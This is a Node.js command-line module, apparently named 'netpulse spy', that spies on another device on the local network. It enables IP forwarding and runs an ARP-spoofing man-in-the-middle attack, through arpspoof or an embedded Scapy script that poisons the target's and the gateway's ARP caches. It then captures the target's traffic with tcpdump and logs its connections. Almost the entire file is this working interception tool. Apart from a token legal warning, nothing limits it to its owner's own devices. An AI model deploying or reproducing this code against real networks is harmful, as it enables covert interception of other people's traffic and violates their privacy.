#!/usr/bin/env node

const { execSync, exec } = require('child_process');
const { spawn }          = require('child_process');
const chalk = require('chalk');
const os    = require('os');
const net   = require('net');

// ─── Port map ──────────────────────────────────────────────────────────────
const PORT_MAP = {
  80:    { name: 'HTTP',          emoji: '🌐', category: 'web'      },
  443:   { name: 'HTTPS',         emoji: '🔒', category: 'web'      },
  53:    { name: 'DNS',           emoji: '🔍', category: 'infra'    },
  22:    { name: 'SSH',           emoji: '🔐', category: 'admin'    },
  21:    { name: 'FTP',           emoji: '📁', category: 'transfer' },
  25:    { name: 'SMTP',          emoji: '📧', category: 'mail'     },
  587:   { name: 'SMTP-TLS',      emoji: '📧', category: 'mail'     },
  993:   { name: 'IMAP',          emoji: '📬', category: 'mail'     },
  995:   { name: 'POP3',          emoji: '📬', category: 'mail'     },
  143:   { name: 'IMAP',          emoji: '📬', category: 'mail'     },
  3306:  { name: 'MySQL',         emoji: '🗄️',  category: 'database' },
  5432:  { name: 'PostgreSQL',    emoji: '🗄️',  category: 'database' },
  27017: { name: 'MongoDB',       emoji: '🗄️',  category: 'database' },
  6379:  { name: 'Redis',         emoji: '🗄️',  category: 'database' },
  8080:  { name: 'HTTP-Alt',      emoji: '🌐', category: 'web'      },
  8443:  { name: 'HTTPS-Alt',     emoji: '🔒', category: 'web'      },
  3000:  { name: 'Dev Server',    emoji: '⚙️',  category: 'dev'      },
  4000:  { name: 'Dev Server',    emoji: '⚙️',  category: 'dev'      },
  5000:  { name: 'Dev Server',    emoji: '⚙️',  category: 'dev'      },
  1935:  { name: 'Streaming',     emoji: '📺', category: 'stream'   },
  554:   { name: 'RTSP Stream',   emoji: '📺', category: 'stream'   },
  3478:  { name: 'WebRTC/STUN',   emoji: '📞', category: 'voip'     },
  5060:  { name: 'SIP/VoIP',      emoji: '📞', category: 'voip'     },
  5228:  { name: 'Google Push',   emoji: '🔔', category: 'push'     },
  5222:  { name: 'XMPP/Chat',     emoji: '💬', category: 'chat'     },
  5349:  { name: 'TURNS/WebRTC',  emoji: '📞', category: 'voip'     },
  1194:  { name: 'OpenVPN',       emoji: '🔒', category: 'vpn'      },
  1723:  { name: 'PPTP VPN',      emoji: '🔒', category: 'vpn'      },
  51820: { name: 'WireGuard',     emoji: '🔒', category: 'vpn'      },
  4444:  { name: ' BACKDOOR',   emoji: '💀', category: 'malware'  },
  6667:  { name: ' IRC/Bot',    emoji: '💀', category: 'malware'  },
  1337:  { name: ' LEET/RAT',  emoji: '💀', category: 'malware'  },
  31337: { name: ' ELITE RAT', emoji: '💀', category: 'malware'  },
  9050:  { name: 'Tor Proxy',     emoji: '🧅', category: 'anon'     },
  9001:  { name: 'Tor ORPort',    emoji: '🧅', category: 'anon'     },
  67:    { name: 'DHCP',          emoji: '📡', category: 'infra'    },
  123:   { name: 'NTP/Clock',     emoji: '🕐', category: 'infra'    },
  161:   { name: 'SNMP',          emoji: '📡', category: 'infra'    },
  500:   { name: 'IPSec VPN',     emoji: '🔒', category: 'vpn'      },
  4500:  { name: 'IPSec NAT',     emoji: '🔒', category: 'vpn'      },
  11994: { name: 'OpenConnect VPN',emoji: '🔒',category: 'vpn'      },
};

const IP_SERVICES = [
  { range: '17.',       name: 'Apple/iCloud',     emoji: '🍎' },
  { range: '157.240.', name: 'Facebook/Meta',    emoji: '👤' },
  { range: '31.13.',   name: 'Facebook/Meta',    emoji: '👤' },
  { range: '216.58.',  name: 'Google',            emoji: '🔵' },
  { range: '172.217.', name: 'Google',            emoji: '🔵' },
  { range: '142.250.', name: 'Google',            emoji: '🔵' },
  { range: '74.125.',  name: 'Google',            emoji: '🔵' },
  { range: '34.',      name: 'AWS',               emoji: '☁️'  },
  { range: '52.',      name: 'AWS',               emoji: '☁️'  },
  { range: '54.',      name: 'AWS',               emoji: '☁️'  },
  { range: '3.',       name: 'AWS',               emoji: '☁️'  },
  { range: '104.',     name: 'Cloudflare',        emoji: '🌤️' },
  { range: '162.158.', name: 'Cloudflare',        emoji: '🌤️' },
  { range: '151.101.', name: 'Fastly CDN',        emoji: '🌐' },
  { range: '140.82.',  name: 'GitHub',            emoji: '🐱' },
  { range: '192.30.',  name: 'GitHub',            emoji: '🐱' },
  { range: '185.199.', name: 'GitHub Pages',      emoji: '🐱' },
  { range: '208.65.',  name: 'WhatsApp',          emoji: '💬' },
  { range: '31.13.',   name: 'Instagram',         emoji: '📷' },
  { range: '13.107.',  name: 'Microsoft/Azure',   emoji: '🪟' },
  { range: '40.96.',   name: 'Microsoft',         emoji: '🪟' },
  { range: '20.',      name: 'Azure',             emoji: '🪟' },
  { range: '199.232.', name: 'Fastly/npm CDN',    emoji: '📦' },
  { range: '18.',      name: 'AWS',               emoji: '☁️'  },
  { range: '35.',      name: 'Google Cloud',      emoji: '🔵' },
  { range: '130.211.', name: 'Google Cloud LB',   emoji: '🔵' },
  { range: '64.18.',   name: 'Google',            emoji: '🔵' },
  { range: '108.177.', name: 'Google',            emoji: '🔵' },
  { range: '23.32.',   name: 'Akamai CDN',        emoji: '🌐' },
  { range: '23.64.',   name: 'Akamai CDN',        emoji: '🌐' },
  { range: '103.21.',  name: 'Cloudflare',        emoji: '🌤️' },
  { range: '8.8.',     name: 'Google DNS',        emoji: '🔍' },
  { range: '1.1.',     name: 'Cloudflare DNS',    emoji: '🔍' },
  { range: '149.154.', name: 'Telegram',          emoji: '✈️'  },
  { range: '91.108.',  name: 'Telegram',          emoji: '✈️'  },
];

// ─── Helpers ───────────────────────────────────────────────────────────────
function isSudo() {
  try { return process.getuid() === 0; } catch (e) { return false; }
}

function getLocalIP() {
  try {
    if (os.platform() === 'darwin')
      return execSync('ipconfig getifaddr en0', { encoding: 'utf8' }).trim();
    return execSync("hostname -I | awk '{print $1}'", { encoding: 'utf8' }).trim();
  } catch (e) { return null; }
}

function getGatewayIP() {
  try {
    if (os.platform() === 'darwin') {
      const o = execSync('netstat -rn | grep default', { encoding: 'utf8' });
      return o.match(/(\d+\.\d+\.\d+\.\d+)/)?.[1];
    }
    const o = execSync("ip route | grep default", { encoding: 'utf8' });
    return o.match(/via (\d+\.\d+\.\d+\.\d+)/)?.[1];
  } catch (e) { return null; }
}

function getIface() {
  try {
    if (os.platform() === 'darwin') {
      try { execSync('ipconfig getifaddr en0', { stdio:'ignore' }); return 'en0'; } catch(e){}
      try { execSync('ipconfig getifaddr en1', { stdio:'ignore' }); return 'en1'; } catch(e){}
    }
    return execSync("ip route | grep default | awk '{print $5}'", { encoding:'utf8' }).trim();
  } catch(e) { return 'en0'; }
}

// macOS Wi-Fi (en0) doesn't support promiscuous mode via BPF/BIOCPROMISC
// 'pktap' is a macOS pseudo-interface that CAN capture all traffic without it
// On Linux, use the real interface directly
function getCaptureIface(realIface) {
  if (os.platform() === 'darwin') return 'pktap,' + realIface;
  return realIface;
}

// ─── FIX: macOS-compatible ping + exact IP ARP match ──────────────────────
function getMAC(ip) {
  const platform = os.platform();
  // Ping to populate ARP cache — macOS uses -t, Linux uses -W
  try {
    if (platform === 'darwin') {
      execSync(`ping -c 3 -t 2 ${ip}`, { timeout: 8000, stdio: 'ignore' });
    } else {
      execSync(`ping -c 3 -W 2 ${ip}`, { timeout: 8000, stdio: 'ignore' });
    }
  } catch(e) {}

  // Try arp -n <ip> first (Linux)
  try {
    const out = execSync(`arp -n ${ip} 2>/dev/null`, { encoding: 'utf8', timeout: 3000 });
    for (const line of out.split('\n')) {
      if (!line.includes(ip)) continue;
      const m = line.match(/([0-9a-f]{2}(?::[0-9a-f]{2}){5})/i);
      if (m && m[1] !== 'ff:ff:ff:ff:ff:ff') return m[1];
    }
  } catch(e) {}

  // Fallback: arp -a (works on macOS too), match exact (ip)
  try {
    const out = execSync('arp -a', { encoding: 'utf8', timeout: 3000 });
    for (const line of out.split('\n')) {
      if (!line.includes(`(${ip})`)) continue;
      const m = line.match(/([0-9a-f]{2}(?::[0-9a-f]{2}){5})/i);
      if (m) return m[1];
    }
  } catch(e) {}

  return null;
}

function identifyService(ip, port) {
  const ps = PORT_MAP[port];
  let is = null;
  for (const s of IP_SERVICES) {
    if (ip && ip.startsWith(s.range)) { is = s; break; }
  }
  if (ps && is) return { name: `${is.name} · ${ps.name}`, emoji: is.emoji, category: ps.category };
  if (is)       return { name: is.name,  emoji: is.emoji, category: 'known'    };
  if (ps)       return { name: ps.name,  emoji: ps.emoji, category: ps.category };
  return        { name: 'Unknown',       emoji: '❓',     category: 'unknown'  };
}

function isSuspPort(port) {
  return [4444,6667,1337,31337,9001,9050,12345,54321,1080].includes(+port);
}

function isPrivateIP(ip) {
  return ip.startsWith('10.') ||
         ip.startsWith('172.16.') ||
         ip.startsWith('192.168.') ||
         ip.startsWith('127.');
}

function fmtBytes(b) {
  if (b < 1024)     return `${b}B`;
  if (b < 1048576)  return `${(b/1024).toFixed(1)}KB`;
  return `${(b/1048576).toFixed(1)}MB`;
}

function fmtTime(ts) {
  return new Date(ts).toLocaleTimeString('en-US', { hour12: false });
}

// ─── IP Forwarding ─────────────────────────────────────────────────────────
function enableFwd() {
  try {
    if (os.platform() === 'darwin')
      execSync('sysctl -w net.inet.ip.forwarding=1', { stdio:'ignore' });
    else
      execSync('echo 1 > /proc/sys/net/ipv4/ip_forward', { stdio:'ignore' });
  } catch(e) {}
}
function disableFwd() {
  try {
    if (os.platform() === 'darwin')
      execSync('sysctl -w net.inet.ip.forwarding=0', { stdio:'ignore' });
    else
      execSync('echo 0 > /proc/sys/net/ipv4/ip_forward', { stdio:'ignore' });
  } catch(e) {}
}

// ─── Get MAC for a specific IP (used by spoof) ─────────────────────────────
function getMACForSpoof(ip) {
  try {
    const out = execSync('arp -a', { encoding: 'utf8', timeout: 3000 });
    for (const line of out.split('\n')) {
      if (!line.includes(`(${ip})`)) continue;
      const m = line.match(/([0-9a-f]{2}(?::[0-9a-f]{2}){5})/i);
      if (m && m[1] !== 'ff:ff:ff:ff:ff:ff') return m[1];
    }
  } catch(e) {}
  return 'ff:ff:ff:ff:ff:ff'; // fallback broadcast
}

// ─── ARP Spoof ─────────────────────────────────────────────────────────────
function startSpoof(targetIP, gatewayIP, iface) {
  // arpspoof (dsniff) — most reliable
  try {
    execSync('which arpspoof', { stdio:'ignore' });
    const p1 = exec(`arpspoof -i ${iface} -t ${targetIP} ${gatewayIP} 2>/dev/null`);
    const p2 = exec(`arpspoof -i ${iface} -t ${gatewayIP} ${targetIP} 2>/dev/null`);
    return { p1, p2, method: 'arpspoof' };
  } catch(e) {}

  // Scapy fallback — resolve MACs inside Python (more reliable than pre-resolving in Node)
  try {
    execSync('python3 -c "from scapy.all import ARP"', { stdio:'ignore' });
    const script = `
from scapy.all import ARP, Ether, sendp, get_if_hwaddr, getmacbyip, conf, srp
import time, sys
conf.verb = 0
iface  = "${iface}"
target = "${targetIP}"
gw     = "${gatewayIP}"
my_mac = get_if_hwaddr(iface)

# Resolve MACs with retries
def resolve_mac(ip, retries=5):
    for i in range(retries):
        mac = getmacbyip(ip)
        if mac and mac != 'ff:ff:ff:ff:ff:ff':
            return mac
        time.sleep(1)
    return None

print(f"[scapy] Resolving MACs...", flush=True)
target_mac = resolve_mac(target)
gw_mac     = resolve_mac(gw)

if not target_mac:
    print(f"[scapy] WARNING: Could not resolve {target} MAC — using broadcast", flush=True)
    target_mac = "ff:ff:ff:ff:ff:ff"
if not gw_mac:
    print(f"[scapy] WARNING: Could not resolve {gw} MAC — using broadcast", flush=True)
    gw_mac = "ff:ff:ff:ff:ff:ff"

print(f"[scapy] target={target}({target_mac}) gw={gw}({gw_mac}) me={my_mac}", flush=True)

while True:
    # Tell target: I am the gateway (send unicast to target)
    sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target, psrc=gw,     hwsrc=my_mac), iface=iface, verbose=False)
    # Tell gateway: I am the target (send unicast to gateway)
    sendp(Ether(dst=gw_mac)    /ARP(op=2, pdst=gw,     psrc=target, hwsrc=my_mac), iface=iface, verbose=False)
    time.sleep(1)
`;
    const p = exec(`python3 -c '${script}'`);
    p.stdout && p.stdout.on('data', d => {
      d.toString().trim().split('\n').forEach(line => {
        if (line.trim()) process.stdout.write(chalk.dim(`\n  ${line.trim()}\n`));
      });
    });
    p.stderr && p.stderr.on('data', () => {});
    return { p1: p, method: 'scapy' };
  } catch(e) {}

  return { method: 'none' };
}

function stopSpoof(procs) {
  try { if (procs.p1) procs.p1.kill('SIGKILL'); } catch(e) {}
  try { if (procs.p2) procs.p2.kill('SIGKILL'); } catch(e) {}
}

// ─── tcpdump capture ──────────────────────────────────────────────────────
function startCapture(targetIP, iface, onLine) {
  try { execSync('which tcpdump', { stdio:'ignore' }); } catch(e) {
    console.log(chalk.red('   tcpdump not found. Install: brew install tcpdump'));
    return null;
  }

  // NO -v flag — keeps output single-line per packet, much easier to parse
  // -q quiet mode — less noise, cleaner lines
  // -s 0 — full packet capture
  const proc = spawn('tcpdump', [
    '-i', iface,
    '-l',           // line buffered — don't wait to flush
    '-n',           // no DNS resolution
    '-q',           // quiet — one line per packet
    '-tt',          // unix timestamp
    '-s', '0',      // full packet
    `host ${targetIP}`
  ], { stdio: ['ignore', 'pipe', 'pipe'] });

  let buf = '';
  proc.stdout.on('data', d => {
    buf += d.toString();
    const lines = buf.split('\n');
    buf = lines.pop(); // keep incomplete last line in buffer
    lines.forEach(line => { if (line.trim()) onLine(line); });
  });

  // Show tcpdump errors (not normal startup messages)
  proc.stderr && proc.stderr.on('data', d => {
    const msg = d.toString().trim();
    if (msg && !msg.includes('listening on') && !msg.includes('packets captured')) {
      process.stdout.write(chalk.dim(`\n  [tcpdump] ${msg}\n`));
    }
  });

  proc.on('error', (e) => {
    console.log(chalk.red(`\n   tcpdump error: ${e.message}`));
  });
  return proc;
}

// ─── Parse tcpdump line ────────────────────────────────────────────────────
function parseLine(line, targetIP) {
  try {
    const m = line.match(/(\d+\.\d+\.\d+\.\d+)\.(\d+)\s*[><]\s*(\d+\.\d+\.\d+\.\d+)\.(\d+)/);
    if (!m) return null;
    const [, srcIP, srcPort, dstIP, dstPort] = m;
    const isOutgoing = srcIP === targetIP;
    const proto  = line.includes('UDP') ? 'UDP' : 'TCP';
    const lenM   = line.match(/length (\d+)/);
    const flags  = line.match(/Flags \[([^\]]+)\]/)?.[1] || '';
    const ttlM   = line.match(/ttl (\d+)/i);
    const winM   = line.match(/win (\d+)/);
    return {
      srcIP, srcPort: +srcPort,
      dstIP, dstPort: +dstPort,
      isOutgoing,
      protocol: proto,
      length:   lenM  ? +lenM[1]  : 0,
      flags:    flags,
      ttl:      ttlM  ? +ttlM[1]  : null,
      win:      winM  ? +winM[1]  : null,
      raw:      line.trim(),
    };
  } catch(e) { return null; }
}

// ─── Activity bar ─────────────────────────────────────────────────────────
function activityBar(count, max = 20) {
  const filled = Math.min(Math.round((count / Math.max(max, 1)) * 10), 10);
  return chalk.green('█'.repeat(filled)) + chalk.dim('░'.repeat(10 - filled));
}

// ─── DeviceSpy ─────────────────────────────────────────────────────────────
class DeviceSpy {
  constructor(targetIP, opts = {}) {
    this.targetIP   = targetIP;
    this.localIP    = getLocalIP();
    this.gatewayIP  = getGatewayIP();
    this.iface      = getIface();
    this.verbose    = opts.verbose || false;
    this.stats      = {
      pkts: 0, bytes: 0, outBytes: 0, inBytes: 0,
      protocols: {}, services: {}, suspicious: 0,
      remotes: {}, ports: {}, directions: { in: 0, out: 0 },
      categories: {},
      timeline: [],       // { ts, dir, bytes }
      connections: [],    // full connection log
    };
    this.startTime  = Date.now();
    this.seen       = new Set();
    this.connMap    = new Map(); // ip:port -> { first, last, pkts, bytes }
    this.spoofProcs = null;
    this.capProc    = null;
    this.lineCount  = 0;
  }

  // ─── Header ───────────────────────────────────────────────────────────
  header(mac) {
    console.clear();
    const bar = '═'.repeat(76);
    console.log(chalk.red(`╔${bar}╗`));
    console.log(chalk.red(`║`) + chalk.bgRed.white.bold(`  🕵️  NETPULSE SPY — DEEP TRAFFIC MONITOR`) + chalk.red(' '.repeat(34) + `║`));
    console.log(chalk.red(`╚${bar}╝`));
    console.log();
    console.log(chalk.yellow('  Target  : ') + chalk.white.bold(this.targetIP) + chalk.dim(`   MAC: ${mac || 'unknown (device may block ARP)'}`));
    console.log(chalk.yellow('  Gateway : ') + chalk.white(this.gatewayIP || '?'));
    console.log(chalk.yellow('  You     : ') + chalk.white(this.localIP || '?'));
    console.log(chalk.yellow('  iface   : ') + chalk.white(this.iface));
    console.log(chalk.dim('\n  Ctrl+C to stop & restore network\n'));
    this.printTableHeader();
  }

  printTableHeader() {
    console.log(chalk.dim('─'.repeat(78)));
    console.log(
      chalk.dim('  TIME      ') +
      chalk.dim('DIR    ') +
      chalk.dim('SERVICE/DESTINATION              ') +
      chalk.dim('REMOTE IP            ') +
      chalk.dim('PORT   ') +
      chalk.dim('SIZE   ') +
      chalk.dim('PROTO')
    );
    console.log(chalk.dim('─'.repeat(78)));
  }

  // ─── Log a packet ─────────────────────────────────────────────────────
  log(parsed) {
    if (!parsed) return;
    const { srcIP, srcPort, dstIP, dstPort, isOutgoing, protocol, length, flags } = parsed;
    const remoteIP   = isOutgoing ? dstIP   : srcIP;
    const remotePort = isOutgoing ? dstPort : srcPort;

    // Skip only our own IP and loopback
    if (!remoteIP) return;
    if (remoteIP === this.localIP) return;
    if (remoteIP.startsWith('127.')) return;
    // Allow ALL traffic including via gateway — it's the device's actual traffic

    // Dedup per 5s window per direction
    const key = `${remoteIP}:${remotePort}:${isOutgoing ? 'out' : 'in'}`;
    if (this.seen.has(key)) {
      // Still update stats silently
      this._updateStats(remoteIP, remotePort, isOutgoing, protocol, length);
      return;
    }
    this.seen.add(key);
    setTimeout(() => this.seen.delete(key), 5000);

    this._updateStats(remoteIP, remotePort, isOutgoing, protocol, length);

    const svc    = identifyService(remoteIP, remotePort);
    const susp   = isSuspPort(remotePort);
    const t      = fmtTime(Date.now());
    const dir    = isOutgoing ? chalk.red('OUT→ ') : chalk.green('←IN  ');
    const svcStr = `${svc.emoji} ${svc.name}`.slice(0, 30).padEnd(30);
    const ipStr  = remoteIP.padEnd(20);
    const portStr= String(remotePort).padEnd(6);
    const szStr  = fmtBytes(length).padEnd(6);
    const prStr  = protocol.padEnd(4);

    // Connection tracking
    const connKey = `${remoteIP}:${remotePort}`;
    if (!this.connMap.has(connKey)) {
      this.connMap.set(connKey, { first: Date.now(), last: Date.now(), pkts: 1, bytes: length, dir: isOutgoing ? 'out' : 'in', service: svc });
    } else {
      const c = this.connMap.get(connKey);
      c.last  = Date.now(); c.pkts++; c.bytes += length;
    }

    let line = `  ${t}  ${dir}  ${svcStr}  ${ipStr}  ${portStr}  ${szStr}  ${prStr}`;

    if (susp) {
      console.log(chalk.bgRed.white.bold(line));
      console.log(chalk.bgRed.white(`    SUSPICIOUS PORT ${remotePort} DETECTED! Possible backdoor/malware!`));
      if (this.verbose) console.log(chalk.red(`     Raw: ${parsed.raw}`));
    } else if (isOutgoing) {
      console.log(chalk.dim(line));
      if (this.verbose) console.log(chalk.dim(`     Flags: ${flags || '-'}  Size: ${length}B`));
    } else {
      console.log(chalk.white(line));
      if (this.verbose) console.log(chalk.dim(`     Flags: ${flags || '-'}  Size: ${length}B`));
    }

    this._printStats();
  }

  _updateStats(remoteIP, remotePort, isOutgoing, protocol, length) {
    this.stats.pkts++;
    this.stats.bytes += length;
    if (isOutgoing) { this.stats.outBytes += length; this.stats.directions.out++; }
    else            { this.stats.inBytes  += length; this.stats.directions.in++;  }

    this.stats.protocols[protocol] = (this.stats.protocols[protocol] || 0) + 1;
    this.stats.remotes[remoteIP]   = (this.stats.remotes[remoteIP]   || 0) + length;
    this.stats.ports[remotePort]   = (this.stats.ports[remotePort]   || 0) + 1;

    const svc = identifyService(remoteIP, remotePort);
    this.stats.services[svc.name] = (this.stats.services[svc.name] || 0) + 1;
    this.stats.categories[svc.category] = (this.stats.categories[svc.category] || 0) + 1;

    if (isSuspPort(remotePort)) this.stats.suspicious++;

    this.stats.timeline.push({ ts: Date.now(), dir: isOutgoing ? 'out' : 'in', bytes: length });
  }

  _printStats() {
    const elapsed = Math.floor((Date.now() - this.startTime) / 1000);
    const rate    = elapsed > 0 ? (this.stats.bytes / elapsed) : 0;
    process.stdout.write(
      chalk.dim(`\r  📦 Pkts: ${this.stats.pkts}  `) +
      chalk.red(`↑${fmtBytes(this.stats.outBytes)} `) +
      chalk.green(`↓${fmtBytes(this.stats.inBytes)}  `) +
      chalk.yellow(`⚡${fmtBytes(rate)}/s  `) +
      chalk.red(`💀Susp: ${this.stats.suspicious}  `) +
      chalk.dim(`⏱ ${elapsed}s`) +
      `\r`
    );
  }

  // ─── Final report ─────────────────────────────────────────────────────
  report() {
    const dur  = Math.floor((Date.now() - this.startTime) / 1000);
    const W    = 60;
    const line = '═'.repeat(W);

    console.log('\n\n');
    console.log(chalk.red(`╔${line}╗`));
    console.log(chalk.red(`║`) + chalk.bgRed.white.bold(`  📊 NETPULSE SPY — SESSION REPORT`) + chalk.red(' '.repeat(W - 34) + `║`));
    console.log(chalk.red(`╚${line}╝`));

    // ── Overview ──────────────────────────────────────────────────────
    console.log(chalk.yellow('\n  ── OVERVIEW ──────────────────────────────────────'));
    console.log(`  Target IP  : ${chalk.bold(this.targetIP)}`);
    console.log(`  Duration   : ${chalk.bold(dur + 's')} (${new Date(this.startTime).toLocaleTimeString()} → ${new Date().toLocaleTimeString()})`);
    console.log(`  Total Pkts : ${chalk.bold(this.stats.pkts)}`);
    console.log(`  Total Data : ${chalk.bold(fmtBytes(this.stats.bytes))}`);
    console.log(`  Uploaded   : ${chalk.red('↑ ' + fmtBytes(this.stats.outBytes))} (${this.stats.directions.out} packets)`);
    console.log(`  Downloaded : ${chalk.green('↓ ' + fmtBytes(this.stats.inBytes))} (${this.stats.directions.in} packets)`);
    console.log(`  Avg Rate   : ${chalk.yellow((dur > 0 ? fmtBytes(this.stats.bytes / dur) : '0B') + '/s')}`);
    console.log(`  Suspicious : ${this.stats.suspicious > 0 ? chalk.bgRed.white('   ' + this.stats.suspicious + ' ') : chalk.green('None ✅')}`);

    // ── Protocols ─────────────────────────────────────────────────────
    const protos = Object.entries(this.stats.protocols).sort((a, b) => b[1] - a[1]);
    if (protos.length) {
      console.log(chalk.yellow('\n  ── PROTOCOLS ─────────────────────────────────────'));
      protos.forEach(([p, n]) => {
        console.log(`  ${p.padEnd(8)}  ${activityBar(n, this.stats.pkts)}  ${n} pkts`);
      });
    }

    // ── Traffic Categories ─────────────────────────────────────────────
    const cats = Object.entries(this.stats.categories).sort((a, b) => b[1] - a[1]);
    if (cats.length) {
      console.log(chalk.yellow('\n  ── ACTIVITY CATEGORIES ───────────────────────────'));
      const catEmojis = {
        web:'🌐', infra:'📡', admin:'🔐', mail:'📧', database:'🗄️',
        stream:'📺', voip:'📞', vpn:'🔒', push:'🔔', chat:'💬',
        anon:'🧅', dev:'⚙️', malware:'💀', known:'✅', unknown:'❓', transfer:'📁'
      };
      cats.forEach(([cat, n]) => {
        const e = catEmojis[cat] || '❓';
        console.log(`  ${e} ${cat.padEnd(12)}  ${activityBar(n, this.stats.pkts)}  ${n}x`);
      });
    }

    // ── Top Services ──────────────────────────────────────────────────
    const svcs = Object.entries(this.stats.services).sort((a, b) => b[1] - a[1]).slice(0, 10);
    if (svcs.length) {
      console.log(chalk.yellow('\n  ── TOP SERVICES ──────────────────────────────────'));
      svcs.forEach(([s, n], i) => {
        console.log(`  ${String(i+1).padStart(2)}. ${s.padEnd(32)} ${activityBar(n, svcs[0][1])}  ×${n}`);
      });
    }

    // ── Top Remote IPs ────────────────────────────────────────────────
    const ips = Object.entries(this.stats.remotes).sort((a, b) => b[1] - a[1]).slice(0, 10);
    if (ips.length) {
      console.log(chalk.yellow('\n  ── TOP REMOTE IPs (by bytes) ─────────────────────'));
      console.log(chalk.dim('  #   IP                   SERVICE                 BYTES'));
      console.log(chalk.dim('  ' + '─'.repeat(54)));
      ips.forEach(([ip, bytes], i) => {
        const s  = identifyService(ip, 443);
        const pub = isPrivateIP(ip) ? chalk.dim('(local)') : '';
        console.log(
          `  ${String(i+1).padStart(2)}. ${ip.padEnd(20)} ${(s.emoji + ' ' + s.name).slice(0,22).padEnd(24)} ${chalk.cyan(fmtBytes(bytes))} ${pub}`
        );
      });
    }

    // ── Top Ports ────────────────────────────────────────────────────
    const ports = Object.entries(this.stats.ports).sort((a, b) => b[1] - a[1]).slice(0, 10);
    if (ports.length) {
      console.log(chalk.yellow('\n  ── TOP PORTS ─────────────────────────────────────'));
      console.log(chalk.dim('  PORT    SERVICE              PACKETS'));
      ports.forEach(([port, n]) => {
        const ps   = PORT_MAP[+port];
        const name = ps ? `${ps.emoji} ${ps.name}` : '❓ Unknown';
        const susp = isSuspPort(+port) ? chalk.bgRed.white('  SUSPICIOUS ') : '';
        console.log(`  ${String(port).padEnd(7)} ${name.slice(0,20).padEnd(22)} ×${n}  ${susp}`);
      });
    }

    // ── Active Connections Summary ─────────────────────────────────────
    const conns = [...this.connMap.entries()]
      .map(([k, v]) => ({ key: k, ...v }))
      .sort((a, b) => b.bytes - a.bytes)
      .slice(0, 8);
    if (conns.length) {
      console.log(chalk.yellow('\n  ── CONNECTION SESSIONS ───────────────────────────'));
      console.log(chalk.dim('  REMOTE               SERVICE             PKTS  BYTES    DURATION'));
      conns.forEach(c => {
        const dur = Math.floor((c.last - c.first) / 1000);
        const ip  = c.key.split(':')[0];
        const svc = c.service;
        console.log(
          `  ${ip.padEnd(20)} ${(svc.emoji + ' ' + svc.name).slice(0,20).padEnd(20)} ${String(c.pkts).padEnd(5)} ${fmtBytes(c.bytes).padEnd(8)} ${dur}s`
        );
      });
    }

    // ── Suspicious ────────────────────────────────────────────────────
    if (this.stats.suspicious > 0) {
      console.log(chalk.bgRed.white.bold('\n    SUSPICIOUS ACTIVITY DETECTED '));
      console.log(chalk.red('  Check the ports flagged above — possible malware/backdoor!'));
    }

    console.log(chalk.green('\n  ✅ ARP restored. Network back to normal.\n'));
    console.log(chalk.dim('  ' + '─'.repeat(W)));
  }

  // ─── Start ────────────────────────────────────────────────────────────
  async start() {
    if (!isSudo()) {
      console.log(chalk.red('\n Needs sudo for packet capture.\n'));
      console.log(chalk.yellow(`   sudo netpulse spy --device ${this.targetIP}\n`));
      process.exit(1);
    }

    console.log(chalk.yellow('\n🔍 Pinging target to populate ARP cache...'));
    const mac = getMAC(this.targetIP);

    // ── FIX: Don't exit if MAC not found — device may block ARP ──────
    if (!mac) {
      console.log(chalk.yellow(`\n  MAC not resolved (device may block ARP or cache expired).`));
      console.log(chalk.dim('   Proceeding anyway — traffic capture will still work.\n'));
    } else {
      console.log(chalk.green(`✅ MAC resolved: ${mac}\n`));
    }

    enableFwd();
    this.header(mac);

    // ARP Spoof
    this.spoofProcs = startSpoof(this.targetIP, this.gatewayIP, this.iface);
    if (this.spoofProcs.method !== 'none') {
      console.log(chalk.green(`  ✅ ARP spoof active (${this.spoofProcs.method})`));
      // Verify spoof worked after 5s — check if target's ARP entry now points to our MAC
      setTimeout(() => {
        try {
          const myMAC = execSync(`ipconfig getifaddr en0 2>/dev/null || true`, { encoding: 'utf8' });
          const arpOut = execSync('arp -a', { encoding: 'utf8' });
          const targetLine = arpOut.split('\n').find(l => l.includes(`(${this.targetIP})`));
          if (targetLine) {
            process.stdout.write(chalk.dim(`\n  [ARP verify] ${targetLine.trim()}\n`));
          } else {
            process.stdout.write(chalk.yellow(`\n    Target not in ARP table yet — device may be idle\n`));
          }
        } catch(e) {}
      }, 5000);
    } else {
      console.log(chalk.yellow('    ARP spoof unavailable — passive capture only'));
      console.log(chalk.dim('     Install: brew install dsniff   OR   pip3 install scapy'));
      console.log(chalk.yellow('  ℹ️  Without ARP spoof, only broadcast/multicast traffic visible'));
    }

    // Capture — use pktap on macOS to bypass promiscuous mode restriction
    const captureIface = getCaptureIface(this.iface);
    if (captureIface !== this.iface) {
      console.log(chalk.dim(`  ℹ️  macOS: using ${captureIface} for capture (bypasses BIOCPROMISC)`));
    }
    this.capProc = startCapture(this.targetIP, captureIface, (line) => {
      this.log(parseLine(line, this.targetIP));
    });

    if (!this.capProc) {
      stopSpoof(this.spoofProcs);
      disableFwd();
      process.exit(1);
    }
    console.log(chalk.green('  ✅ tcpdump capture active\n'));
    this.printTableHeader();

    const cleanup = () => {
      console.log(chalk.yellow('\n\n  🛑 Stopping capture...'));
      stopSpoof(this.spoofProcs);
      try { this.capProc.kill('SIGKILL'); } catch(e) {}
      disableFwd();
      this.report();
      process.exit(0);
    };
    process.on('SIGINT',  cleanup);
    process.on('SIGTERM', cleanup);
  }
}

// ─── CLI ───────────────────────────────────────────────────────────────────
async function startSpy(args = []) {
  let targetIP = null;
  let verbose  = false;
  for (let i = 0; i < args.length; i++) {
    if ((args[i] === '--device' || args[i] === '-d') && args[i+1]) targetIP = args[++i];
    if (args[i] === '--verbose' || args[i] === '-v') verbose = true;
  }

  if (!targetIP || !net.isIPv4(targetIP)) {
    console.log(chalk.red('\n Usage: sudo netpulse spy --device <ip> [--verbose]\n'));
    console.log(chalk.dim('Tip: Run "netpulse devices" to find IPs\n'));
    process.exit(1);
  }

  console.log(chalk.bgRed.white('\n    LEGAL WARNING  '));
  console.log(chalk.red('  Only use on YOUR OWN network.\n'));
  console.log(chalk.yellow('  Starting in 3 seconds... (Ctrl+C to cancel)\n'));
  await new Promise(r => setTimeout(r, 3000));

  const spy = new DeviceSpy(targetIP, { verbose });
  await spy.start();
}

module.exports = { startSpy, DeviceSpy };